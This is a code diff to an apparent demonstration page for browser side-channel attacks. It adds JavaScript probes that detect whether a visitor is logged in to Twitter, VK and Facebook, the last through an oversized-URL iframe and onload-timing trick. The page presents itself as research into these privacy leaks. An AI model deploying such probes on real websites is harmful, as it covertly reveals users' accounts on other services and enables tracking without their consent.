@@ -95,9 +95,14 @@ check_redirect('https://plus.google.com/photos/instantupload', function(guess){
   debug('Logged in on google+ — '+ (guess ? 'yes' : 'no'));
 })
 
-check_redirect('https://twitter.com/i/connect', function(guess){
+check_redirect('https://twitter.com/following', function(guess){
   debug('Logged in on twitter — '+ (guess ? 'yes' : 'no'));
 })
+
+check_redirect('http://vk.com/friends', function(guess){
+  debug('Logged in on vk — '+ (guess ? 'yes' : 'no'));
+})
+
 
 </textarea>
 
@@ -117,3 +122,25 @@ check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt
 </pre>
 <hr/>
 <h1>Clickjacking URL-change detection</h1>
+
+
+
+<hr/>
+<h1>414 and X-Frame-Options based detection</h1>
+
+var a='';
+for(var i=0;i<50000;i++){a+='=';}
+
+var wait = setTimeout(function(){
+  alert('Logged in fb')
+},15000)
+
+var cb=function(){
+  clearTimeout(wait);
+  alert('Not logged in fb');
+}
+
+a='https://www.facebook.com/messages/new?'+a;
+console.log(a.length);
+document.write('<iframe onload="cb()" src="'+a+'"></iframe>')
+
